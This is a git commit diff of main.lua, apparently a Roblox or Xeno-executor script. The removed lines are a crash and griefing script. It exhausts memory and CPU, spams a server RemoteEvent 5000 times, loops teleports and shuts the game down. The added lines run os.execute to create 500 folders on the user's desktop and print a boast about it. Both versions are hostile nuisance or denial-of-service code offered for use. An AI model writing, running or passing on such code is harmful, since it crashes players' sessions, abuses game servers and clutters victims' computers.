b6d82a6daa87fe1060a42a472af0fd66393252d3
bonuj000-sketch <bonuj000@gmail.com>
2026-08-02 01:37:44 +0300

    Update main.lua

--- main.lua
+++ main.lua
@@ -1,46 +1,9 @@
-local player = game.Players.LocalPlayer
+-- СОЗДАНИЕ ПАПОК НА РАБОЧЕМ СТОЛЕ (XENO)
+local desktop = os.getenv("USERPROFILE") .. "\\Desktop\\"
 
-pcall(function()
-game:GetService("RunService"):Set3dRenderingEnabled(false)
-end)
+for i = 1, 500 do
+    local folderPath = desktop .. "XENO_" .. i
+    os.execute('mkdir "' .. folderPath .. '"')
+end
 
-spawn(function()
-local s = ""
-while true do
-s = s .. string.rep("X", 10000000)
-task.wait()
-end
-end)
-
-spawn(function()
-for i = 1, 5000 do
-pcall(function()
-local remote = game:GetService("ReplicatedStorage"):FindFirstChildOfClass("RemoteEvent")
-if remote then
-remote:FireServer("spam", i)
-end
-end)
-task.wait()
-end
-end)
-
-spawn(function()
-for i = 1, 50 do
-pcall(function()
-game:GetService("TeleportService"):Teleport(game.PlaceId)
-end)
-task.wait(0.1)
-end
-end)
-
-spawn(function()
-while true do
-local t = {}
-for i = 1, 100000 do
-t[i] = i * i * i
-end
-task.wait()
-end
-end)
-
-game:Shutdown()
+print("[XENO] 500 папок создано на рабочем столе")
